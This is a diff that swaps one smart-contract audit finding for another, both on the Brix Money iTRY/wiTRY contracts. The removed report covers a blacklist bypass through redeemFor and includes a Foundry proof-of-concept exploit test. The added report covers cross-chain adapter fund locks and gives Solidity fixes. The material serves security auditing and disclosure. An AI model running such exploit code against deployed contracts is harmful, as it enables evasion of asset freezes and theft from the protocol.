@@ -1,315 +1,196 @@
+Based on my thorough analysis of the Brix Money codebase, I have validated this security claim against all framework requirements. Here is my assessment:
+
 ## Title
-FastAccessVault.processTransfer Enables Blacklist Bypass by Sending DLF to iTRY-Blacklisted Recipients Without Validation
+Cross-Chain Share/Token Transfer to Blacklisted Recipient Causes Permanent Fund Lock in OFTAdapter
 
 ## Summary
-The `processTransfer` function in `FastAccessVault.sol` sends DLF tokens directly to recipients without validating their blacklist status in the iTRY token contract. This allows iTRY-blacklisted users to receive value (DLF backing assets) through the `redeemFor` function, bypassing the intended access control restrictions and impairing rescue operations during security incidents.
+The `wiTryOFTAdapter` and `iTryTokenOFTAdapter` contracts on L1 (hub chain) lack blacklist validation when unlocking shares/tokens for cross-chain recipients. When users bridge wiTRY shares or iTRY tokens from L2 back to L1 with a blacklisted recipient, the underlying token's `_beforeTokenTransfer` hook reverts the transfer, causing the LayerZero message to fail and permanently locking the funds in the adapter contract. This architectural inconsistency creates a one-way blacklist enforcement gap, as the spoke chain OFT contracts implement protective `_credit` overrides that the hub chain adapters lack.
 
 ## Impact
 **Severity**: Medium
 
+This represents a **Medium severity** vulnerability under the Code4rena framework due to:
+- **High impact**: Complete and permanent loss of bridged funds with no recovery mechanism
+- **Medium likelihood**: Requires recipient to be blacklisted on L1, but realistic given cross-chain blacklist state desynchronization and the protocol's active use of blacklisting for compliance
+
+The combination of permanent loss with moderate preconditions yields an overall Medium severity rating.
+
 ## Finding Description
 
-**Location:** `src/protocol/FastAccessVault.sol` (function `processTransfer`, lines 144-158) and `src/protocol/iTryIssuer.sol` (function `redeemFor`, lines 318-370) [1](#0-0) [2](#0-1) 
+**Location:** 
+- [1](#0-0) 
+- [2](#0-1) 
 
-**Intended Logic:** The blacklist system should prevent blacklisted users from receiving any value from the protocol to enable effective rescue operations during hacks or security incidents, as stated in the README: "blacklist/whitelist bugs that would impair rescue operations in case of hacks or similar black swan events."
+**Intended Logic:** 
+When shares/tokens are sent from L2 back to L1, the OFTAdapter should unlock them from the adapter contract and transfer them to the specified recipient address. The protocol should enforce blacklist restrictions consistently across all transfer paths to prevent blacklisted users from receiving funds.
 
-**Actual Logic:** When `redeemFor` is called, it validates that the caller is whitelisted and burns iTRY from the caller, but the `recipient` parameter is never checked against the iTRY blacklist. The recipient receives DLF tokens directly through `processTransfer`, which only validates that the address is non-zero and has sufficient balance, bypassing iTRY blacklist restrictions. [3](#0-2) 
+**Actual Logic:** 
+Both adapter contracts inherit from LayerZero's base `OFTAdapter` without overriding the `_credit` function. When the base implementation attempts to transfer unlocked shares/tokens to a blacklisted recipient, the underlying token's `_beforeTokenTransfer` hook reverts:
+
+- For wiTRY: [3](#0-2)  reverts when recipient has `FULL_RESTRICTED_STAKER_ROLE`
+- For iTRY: [4](#0-3)  reverts when recipient has `BLACKLISTED_ROLE`
+
+The revert causes the entire LayerZero message to fail. Critically, the spoke chain contracts implement protective `_credit` overrides [5](#0-4)  that redirect funds to the owner when recipients are blacklisted, but the hub chain adapters lack this protection and also lack any rescue function to recover locked tokens.
 
 **Exploitation Path:**
-1. **Blacklist Event**: Protocol administrators blacklist a malicious actor's address (e.g., `hackerAddress`) in the iTRY token contract to freeze their assets during a security incident
-2. **Collusion**: A non-blacklisted accomplice (or any whitelisted user through social engineering) calls `iTryIssuer.redeemFor(hackerAddress, amount, minOut)` 
-3. **iTRY Burn**: The caller's iTRY tokens are burned successfully (caller is not blacklisted)
-4. **DLF Transfer**: `_redeemFromVault` calls `liquidityVault.processTransfer(hackerAddress, netDlfAmount)` which sends DLF directly without checking iTRY blacklist status
-5. **Value Extraction**: The blacklisted hacker receives DLF tokens (assuming they're not separately blacklisted in DLF token), extracting value from the protocol despite being blacklisted [4](#0-3) 
+1. User holds wiTRY shares or iTRY tokens on L2 (OP Sepolia/MegaETH)
+2. User initiates cross-chain transfer back to L1, specifying a recipient address
+3. Recipient is blacklisted on L1 (could be already blacklisted, or blacklisted between transaction initiation and L1 arrival due to compliance actions)
+4. LayerZero message arrives at L1 adapter, base `OFTAdapter._credit` attempts to transfer shares/tokens to recipient
+5. Token's `_beforeTokenTransfer` hook checks blacklist status and reverts
+6. LayerZero message execution fails, but tokens are already burned on L2
+7. Shares/tokens remain permanently locked in adapter on L1 with no recovery mechanism
 
-**Security Property Broken:** The iTRY token's `_beforeTokenTransfer` function enforces that blacklisted users cannot receive iTRY tokens (line 190-192), demonstrating the protocol's intent to completely freeze blacklisted addresses. However, this restriction is bypassed when receiving DLF through the redemption mechanism, as iTRY and DLF maintain separate blacklist systems that can be out of sync. [5](#0-4) 
+**Architectural Gap:**
+The vulnerability stems from an architectural inconsistency:
+- **Spoke chains (L2)**: Implement `_credit` overrides with blacklist protection
+- **Hub chains (L1)**: No `_credit` overrides, rely on base OFTAdapter behavior
+- **Result**: One-way protection gap that locks funds when bridging L2→L1
 
 ## Impact Explanation
 
-- **Affected Assets**: DLF tokens (protocol backing asset) held in FastAccessVault
-- **Damage Severity**: Blacklisted malicious actors can receive value from the protocol by having accomplices or socially-engineered users call `redeemFor` on their behalf. While this requires cooperation from another user, it significantly impairs rescue operations during security incidents where freezing hacker addresses is critical.
-- **User Impact**: Affects all protocol users during security incidents. If a hacker's address is blacklisted but they can still extract DLF, it undermines the effectiveness of the blacklist as a security control and allows value leakage during active exploits.
+**Affected Assets**: 
+- wiTRY shares locked in `wiTryOFTAdapter` on L1 (Ethereum mainnet)
+- iTRY tokens locked in `iTryTokenOFTAdapter` on L1 (Ethereum mainnet)
+
+**Damage Severity**:
+- Complete and permanent loss of 100% of shares/tokens sent in the failed cross-chain transfer
+- Users cannot recover their funds as the adapters lack rescue functions (unlike other protocol contracts that implement `rescueTokens` functionality)
+- Funds are effectively burned on L2 and imprisoned on L1
+
+**User Impact**: 
+Any user performing L2→L1 transfers with a blacklisted recipient loses their entire transferred amount. This affects:
+- Users unknowingly sending to blacklisted addresses
+- Race conditions where recipients are blacklisted between L2 transaction submission and L1 execution
+- Cross-chain blacklist state desynchronization scenarios
+
+**Recovery Options**:
+1. LayerZero V2 allows message retry, but retrying will fail repeatedly if recipient remains blacklisted
+2. Admin could temporarily remove blacklist to complete transfer, but this defeats the compliance purpose of blacklisting
+3. No rescue function exists in adapter contracts to recover locked tokens
 
 ## Likelihood Explanation
 
-- **Attacker Profile**: Blacklisted malicious actors with accomplices, or users who can socially engineer whitelisted participants
-- **Preconditions**: 
-  - Attacker address is blacklisted in iTRY token
-  - Attacker address is NOT blacklisted in DLF token (separate systems)
-  - Accomplice or manipulated user has whitelisted status on iTryIssuer
-  - FastAccessVault has sufficient DLF balance
-- **Execution Complexity**: Single transaction (`redeemFor` call), but requires cooperation from or manipulation of another user
-- **Frequency**: Can be executed repeatedly during the window between iTRY blacklisting and corresponding DLF blacklisting, or indefinitely if DLF blacklist is not updated
+**Attacker Profile**: 
+Any user performing cross-chain transfers, no special privileges required. Can also occur through user error or legitimate compliance actions.
+
+**Preconditions**: 
+1. Recipient address must have blacklist role (`FULL_RESTRICTED_STAKER_ROLE` for wiTRY or `BLACKLISTED_ROLE` for iTRY) on L1
+2. User must initiate L2→L1 cross-chain transfer via LayerZero
+3. LayerZero message successfully relayed (standard operation)
+
+**Execution Complexity**: 
+Single transaction on L2 initiating the send. The vulnerability manifests automatically when the message is processed on L1.
+
+**Realistic Scenarios**:
+1. **Cross-chain blacklist desynchronization**: User address not blacklisted on L2 but blacklisted on L1 due to different compliance requirements or timing of blacklist updates
+2. **Timing race condition**: Recipient blacklisted by protocol admins for legitimate compliance reasons between L2 transaction submission and L1 message arrival
+3. **User error**: User unknowingly sends funds to an address that was previously blacklisted on L1
+
+**Frequency**: 
+Can occur on every L2→L1 transfer to a blacklisted recipient. Given that blacklisting is an active protocol feature for regulatory compliance and security, this scenario is realistic and expected to occur in production environments.
 
 ## Recommendation
 
-Add iTRY blacklist validation for the recipient parameter in both `redeemFor` and `processTransfer` functions:
+Override the `_credit` function in both adapter contracts to match the protection pattern already implemented in the spoke chain OFT contracts. This provides consistent blacklist enforcement across all chains:
 
+**For `wiTryOFTAdapter.sol`:**
 ```solidity
-// In src/protocol/iTryIssuer.sol, function redeemFor, after line 325:
+import {StakediTry} from "../../StakediTry.sol";
 
-// Validate recipient is not blacklisted in iTRY token
-if (iTryToken.hasRole(iTryToken.BLACKLISTED_ROLE(), recipient)) {
-    revert RecipientBlacklisted(recipient);
-}
-```
+bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
 
-Alternative approach: Validate in `FastAccessVault.processTransfer` to provide defense-in-depth:
-
-```solidity
-// In src/protocol/FastAccessVault.sol, function processTransfer, after line 146:
-
-// Validate receiver is not blacklisted in iTRY token
-IiTryToken iTryToken = IiTryToken(_issuerContract.iTryToken());
-if (iTryToken.hasRole(iTryToken.BLACKLISTED_ROLE(), _receiver)) {
-    revert ReceiverBlacklisted(_receiver);
-}
-```
-
-Additional mitigation: Implement synchronized blacklist management across iTRY and DLF tokens, or use a shared blacklist registry to ensure consistency.
-
-## Proof of Concept
-
-```solidity
-// File: test/Exploit_BlacklistBypassViaRedeemFor.t.sol
-// Run with: forge test --match-test test_BlacklistBypass_RedeemForSendsDLFToBlacklistedUser -vvv
-
-pragma solidity ^0.8.0;
-
-import "forge-std/Test.sol";
-import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {iTry} from "../src/token/iTRY/iTry.sol";
-import {DLFToken} from "../src/external/DLFToken.sol";
-import {RedstoneNAVFeed} from "../src/protocol/RedstoneNAVFeed.sol";
-import {iTryIssuer} from "../src/protocol/iTryIssuer.sol";
-import {IFastAccessVault} from "../src/protocol/interfaces/IFastAccessVault.sol";
-
-contract Exploit_BlacklistBypass is Test {
-    iTry public itryToken;
-    DLFToken public dlfToken;
-    RedstoneNAVFeed public oracle;
-    iTryIssuer public issuer;
-    IFastAccessVault public vault;
+function _credit(address _to, uint256 _amountLD, uint32 _srcEid)
+    internal
+    virtual
+    override
+    returns (uint256 amountReceivedLD)
+{
+    StakediTry token = StakediTry(address(innerToken));
     
-    address public admin;
-    address public hacker;
-    address public accomplice;
-    address public treasury;
-    address public custodian;
-    
-    bytes32 constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
-    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
-    uint256 constant INITIAL_NAV = 1e18;
-    
-    function setUp() public {
-        admin = address(this);
-        hacker = makeAddr("hacker");
-        accomplice = makeAddr("accomplice");
-        treasury = makeAddr("treasury");
-        custodian = makeAddr("custodian");
-        
-        // Deploy contracts
-        oracle = new RedstoneNAVFeed();
-        vm.mockCall(
-            address(oracle),
-            abi.encodeWithSelector(RedstoneNAVFeed.price.selector),
-            abi.encode(INITIAL_NAV)
-        );
-        
-        dlfToken = new DLFToken(admin);
-        
-        iTry itryImpl = new iTry();
-        bytes memory initData = abi.encodeWithSelector(
-            iTry.initialize.selector,
-            admin,
-            admin
-        );
-        ERC1967Proxy proxy = new ERC1967Proxy(address(itryImpl), initData);
-        itryToken = iTry(address(proxy));
-        
-        issuer = new iTryIssuer(
-            address(itryToken),
-            address(dlfToken),
-            address(oracle),
-            treasury,
-            address(this), // yieldReceiver
-            custodian,
-            admin,
-            0, // initialIssued
-            0, // initialDLF
-            500, // buffer 5%
-            0 // min balance
-        );
-        
-        vault = issuer.liquidityVault();
-        
-        // Setup roles
-        itryToken.grantRole(MINTER_CONTRACT, address(issuer));
-        issuer.addToWhitelist(accomplice);
-        
-        // Fund accomplice with DLF
-        dlfToken.mint(accomplice, 10000e18);
-    }
-    
-    function test_BlacklistBypass_RedeemForSendsDLFToBlacklistedUser() public {
-        console.log("\n=== EXPLOIT: Blacklist Bypass via redeemFor ===\n");
-        
-        // SETUP: Accomplice mints iTRY and transfers DLF to vault
-        vm.startPrank(accomplice);
-        dlfToken.approve(address(issuer), 5000e18);
-        uint256 itryMinted = issuer.mintITRY(5000e18, 0);
-        vm.stopPrank();
-        
-        console.log("Accomplice minted iTRY:", itryMinted);
-        console.log("Accomplice iTRY balance:", itryToken.balanceOf(accomplice));
-        
-        // Transfer DLF to vault for redemption
-        uint256 vaultDLF = 2500e18;
-        dlfToken.mint(address(vault), vaultDLF);
-        console.log("Vault DLF balance:", dlfToken.balanceOf(address(vault)));
-        
-        // BLACKLIST EVENT: Admin blacklists hacker in iTRY
-        itryToken.addBlacklistAddress(_toArray(hacker));
-        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, hacker), "Hacker should be blacklisted");
-        console.log("\nHacker blacklisted in iTRY token");
-        
-        // Verify hacker CANNOT receive iTRY directly (proper blacklist enforcement)
-        vm.prank(accomplice);
-        vm.expectRevert();
-        itryToken.transfer(hacker, 100e18);
-        console.log("Confirmed: Hacker cannot receive iTRY transfers");
-        
-        // EXPLOIT: Accomplice calls redeemFor to send DLF to blacklisted hacker
-        uint256 redeemAmount = 1000e18;
-        uint256 hackerDLFBefore = dlfToken.balanceOf(hacker);
-        
-        vm.startPrank(accomplice);
-        itryToken.approve(address(issuer), redeemAmount);
-        bool fromBuffer = issuer.redeemFor(hacker, redeemAmount, 0);
-        vm.stopPrank();
-        
-        // VERIFY: Hacker received DLF despite being blacklisted in iTRY
-        uint256 hackerDLFAfter = dlfToken.balanceOf(hacker);
-        console.log("\nExploit Result:");
-        console.log("- Hacker DLF before:", hackerDLFBefore);
-        console.log("- Hacker DLF after:", hackerDLFAfter);
-        console.log("- DLF received:", hackerDLFAfter - hackerDLFBefore);
-        console.log("- Redeemed from buffer:", fromBuffer);
-        
-        assertGt(hackerDLFAfter, hackerDLFBefore, "Vulnerability confirmed: Blacklisted user received DLF");
-        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, hacker), "Hacker still blacklisted in iTRY");
-        
-        console.log("\n=== VULNERABILITY CONFIRMED ===");
-        console.log("Blacklisted iTRY user successfully received DLF tokens");
-        console.log("This bypasses the blacklist restriction and impairs rescue operations");
-    }
-    
-    function _toArray(address addr) internal pure returns (address[] memory) {
-        address[] memory arr = new address[](1);
-        arr[0] = addr;
-        return arr;
+    // If recipient is blacklisted, redirect to owner instead
+    if (token.hasRole(FULL_RESTRICTED_STAKER_ROLE, _to)) {
+        return super._credit(owner(), _amountLD, _srcEid);
+    } else {
+        return super._credit(_to, _amountLD, _srcEid);
     }
 }
 ```
+
+**For `iTryTokenOFTAdapter.sol`:**
+```solidity
+import {iTry} from "../iTry.sol";
+
+bytes32 private constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
+
+function _credit(address _to, uint256 _amountLD, uint32 _srcEid)
+    internal
+    virtual
+    override
+    returns (uint256 amountReceivedLD)
+{
+    iTry token = iTry(address(innerToken));
+    
+    // If recipient is blacklisted, redirect to owner instead
+    if (token.hasRole(BLACKLISTED_ROLE, _to)) {
+        return super._credit(owner(), _amountLD, _srcEid);
+    } else {
+        return super._credit(_to, _amountLD, _srcEid);
+    }
+}
+```
+
+**Alternative Mitigation**: 
+Add a `rescueTokens` function to both adapters following the pattern used in other protocol contracts, allowing the owner to recover tokens locked due to failed transfers. However, the `_credit` override is preferred as it prevents the issue proactively rather than requiring manual recovery intervention.
 
 ## Notes
 
-- This vulnerability requires cooperation from another user (accomplice or socially-engineered participant), which makes it less severe than a direct bypass, but it's still exploitable in realistic attack scenarios where hackers have accomplices.
-- The issue stems from the architectural decision to have separate blacklist systems for iTRY and DLF tokens, which can become desynchronized.
-- The `redeemFor` function's design allows any whitelisted user to specify an arbitrary recipient, which is useful for legitimate use cases but creates a security gap when combined with the lack of blacklist validation.
-- This finding is distinct from the known Zellic issue about allowance-based transfers, as it involves a completely different mechanism (redemption to DLF rather than iTRY transfers).
-- The DLF token's own blacklist provides partial protection, but only if administrators remember to blacklist addresses in both systems simultaneously.
+This vulnerability represents an architectural inconsistency in the protocol's cross-chain blacklist enforcement. The spoke chain contracts [5](#0-4)  correctly implement `_credit` overrides that redirect funds to the owner when recipients are blacklisted, demonstrating that the protocol team was aware of this risk and implemented protection on one side of the bridge. However, the hub chain adapters lack this same protection, creating a one-way enforcement gap.
+
+The issue is particularly significant because:
+1. Blacklisting is an active compliance feature, making this scenario highly likely
+2. The protocol already implemented the correct pattern on spoke chains, proving this is not intentional design
+3. Other protocol contracts implement `rescueTokens` functions, showing rescue mechanisms are standard practice
+4. The adapters lack any rescue functionality, making fund loss truly permanent
+5. The only recovery requires undermining the compliance purpose of blacklisting
+
+This represents a clear gap in the defense-in-depth approach that should be addressed by implementing consistent blacklist handling across both hub and spoke chains.
 
 ### Citations
 
-**File:** src/protocol/FastAccessVault.sol (L144-158)
+**File:** src/token/wiTRY/crosschain/wiTryOFTAdapter.sol (L26-33)
 ```text
-    function processTransfer(address _receiver, uint256 _amount) external onlyIssuer {
-        if (_receiver == address(0)) revert CommonErrors.ZeroAddress();
-        if (_receiver == address(this)) revert InvalidReceiver(_receiver);
-        if (_amount == 0) revert CommonErrors.ZeroAmount();
-
-        uint256 currentBalance = _vaultToken.balanceOf(address(this));
-        if (currentBalance < _amount) {
-            revert InsufficientBufferBalance(_amount, currentBalance);
-        }
-
-        if (!_vaultToken.transfer(_receiver, _amount)) {
-            revert CommonErrors.TransferFailed();
-        }
-        emit TransferProcessed(_receiver, _amount, (currentBalance - _amount));
-    }
+contract wiTryOFTAdapter is OFTAdapter {
+    /**
+     * @notice Constructor for wiTryOFTAdapter
+     * @param _token Address of the wiTRY share token from StakedUSDe
+     * @param _lzEndpoint LayerZero endpoint address for Ethereum Mainnet
+     * @param _owner Address that will own this adapter (typically deployer)
+     */
+    constructor(address _token, address _lzEndpoint, address _owner) OFTAdapter(_token, _lzEndpoint, _owner) {}
 ```
 
-**File:** src/protocol/iTryIssuer.sol (L318-370)
+**File:** src/token/iTRY/crosschain/iTryTokenOFTAdapter.sol (L21-28)
 ```text
-    function redeemFor(address recipient, uint256 iTRYAmount, uint256 minAmountOut)
-        public
-        onlyRole(_WHITELISTED_USER_ROLE)
-        nonReentrant
-        returns (bool fromBuffer)
-    {
-        // Validate recipient address
-        if (recipient == address(0)) revert CommonErrors.ZeroAddress();
-
-        // Validate iTRYAmount > 0
-        if (iTRYAmount == 0) revert CommonErrors.ZeroAmount();
-
-        if (iTRYAmount > _totalIssuedITry) {
-            revert AmountExceedsITryIssuance(iTRYAmount, _totalIssuedITry);
-        }
-
-        // Get NAV price from oracle
-        uint256 navPrice = oracle.price();
-        if (navPrice == 0) revert InvalidNAVPrice(navPrice);
-
-        // Calculate gross DLF amount: iTRYAmount * 1e18 / navPrice
-        uint256 grossDlfAmount = iTRYAmount * 1e18 / navPrice;
-
-        if (grossDlfAmount == 0) revert CommonErrors.ZeroAmount();
-
-        uint256 feeAmount = _calculateRedemptionFee(grossDlfAmount);
-        uint256 netDlfAmount = grossDlfAmount - feeAmount;
-
-        // Check if output meets minimum requirement
-        if (netDlfAmount < minAmountOut) {
-            revert OutputBelowMinimum(netDlfAmount, minAmountOut);
-        }
-
-        _burn(msg.sender, iTRYAmount);
-
-        // Check if buffer pool has enough DLF balance
-        uint256 bufferBalance = liquidityVault.getAvailableBalance();
-
-        if (bufferBalance >= grossDlfAmount) {
-            // Buffer has enough - serve from buffer
-            _redeemFromVault(recipient, netDlfAmount, feeAmount);
-
-            fromBuffer = true;
-        } else {
-            // Buffer insufficient - serve from custodian
-            _redeemFromCustodian(recipient, netDlfAmount, feeAmount);
-
-            fromBuffer = false;
-        }
-
-        // Emit redemption event
-        emit ITRYRedeemed(recipient, iTRYAmount, netDlfAmount, fromBuffer, redemptionFeeInBPS);
-    }
+contract iTryTokenOFTAdapter is OFTAdapter {
+    /**
+     * @notice Constructor for iTryTokenAdapter
+     * @param _token Address of the existing iTryToken contract
+     * @param _lzEndpoint LayerZero endpoint address for Ethereum Mainnet
+     * @param _owner Address that will own this adapter (typically deployer)
+     */
+    constructor(address _token, address _lzEndpoint, address _owner) OFTAdapter(_token, _lzEndpoint, _owner) {}
 ```
 
-**File:** src/protocol/iTryIssuer.sol (L627-635)
+**File:** src/token/wiTRY/StakediTry.sol (L292-298)
 ```text
-    function _redeemFromVault(address receiver, uint256 receiveAmount, uint256 feeAmount) internal {
-        _totalDLFUnderCustody -= (receiveAmount + feeAmount);
-
-        liquidityVault.processTransfer(receiver, receiveAmount);
-
-        if (feeAmount > 0) {
-            liquidityVault.processTransfer(treasury, feeAmount);
+    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
+        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
+            revert OperationNotAllowed();
         }
-    }
+        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
+            revert OperationNotAllowed();
+        }
 ```
 
 **File:** src/token/iTRY/iTry.sol (L177-196)
@@ -336,11 +217,20 @@ contract Exploit_BlacklistBypass is Test {
             }
 ```
 
-**File:** src/external/DLFToken.sol (L25-29)
+**File:** src/token/wiTRY/crosschain/wiTryOFT.sol (L84-97)
 ```text
-    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override whenNotPaused {
-        require(!_isBlacklisted[from], "ERC20: sender is blacklisted");
-        require(!_isBlacklisted[to], "ERC20: recipient is blacklisted");
-        super._beforeTokenTransfer(from, to, amount);
+    function _credit(address _to, uint256 _amountLD, uint32 _srcEid)
+        internal
+        virtual
+        override
+        returns (uint256 amountReceivedLD)
+    {
+        // If the recipient is blacklisted, emit an event, redistribute funds, and credit the owner
+        if (blackList[_to]) {
+            emit RedistributeFunds(_to, _amountLD);
+            return super._credit(owner(), _amountLD, _srcEid);
+        } else {
+            return super._credit(_to, _amountLD, _srcEid);
+        }
     }
 ```
